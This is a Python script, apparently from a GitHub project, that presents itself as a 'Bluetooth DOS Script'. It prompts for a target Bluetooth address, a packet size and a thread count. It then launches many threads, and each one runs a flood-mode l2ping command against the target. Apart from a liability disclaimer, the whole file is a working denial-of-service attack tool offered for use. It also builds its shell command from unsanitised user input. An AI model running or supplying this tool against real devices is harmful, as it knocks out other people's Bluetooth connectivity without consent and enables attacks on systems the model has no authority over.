import os
import threading
import time

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def printLogo():
    print('\x1b[37;4mhttps://github.com/jieggiI\x1b[0m')
    print('\x1b[37;36m')
    print('                            Bluetooth DOS Script                            ')
    print('+-------------------------------------------------------------------------+ ')
    print('|  _ __ ___   __ _  __| | ___   | |__  _   _     (_|_) ___  __ _  __ _(_) | ')
    print("| | '_ ` _ \ / _` |/ _` |/ _ \  | '_ \| | | |    | | |/ _ \/ _` |/ _` | | | ")
    print('| | | | | | | (_| | (_| |  __/  | |_) | |_| |    | | |  __/ (_| | (_| | | | ')
    print('| |_| |_| |_|\__,_|\__,_|\___|  |_.__/ \__, |   _/ |_|\___|\__, |\__, |_| | ')
    print('|                                      |___/   |__/        |___/ |___/    | ')
    print('+-------------------------------------------------------------------------+ ')
    print('\x1b[0m')

def main():
    printLogo()
    time.sleep(0.1)
    print('')
    print('\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')
    if (input("Do you agree? (y/n) > ") in ['y', 'Y']):
        time.sleep(0.1)
        os.system('clear')
        printLogo()
        print('')

        target_addr = input('Target addr > ')

        if len(target_addr) < 1:
            print('[!] ERROR: Target addr is missing')
            exit(0)

        try:
            packages_size = int(input('Packages size > '))
        except:
            print('[!] ERROR: Packages size must be an integer')
            exit(0)
        try:
            threads_count = int(input('Threads count > '))
        except:
            print('[!] ERROR: Threads count must be an integer')
            exit(0)
        print('')
        os.system('clear')

        print("\x1b[31m[*] Starting DOS attack in 3 seconds...")

        for i in range(0, 3):
            print('[*] ' + str(3 - i))
            time.sleep(1)
        os.system('clear')
        print('[*] Building threads...\n')

        for i in range(0, threads_count):
            print('[*] Built thread №' + str(i + 1))
            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

        print('[*] Built all threads...')
        print('[*] Starting...')
    else:
        print('Bip bip')
        exit(0)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))
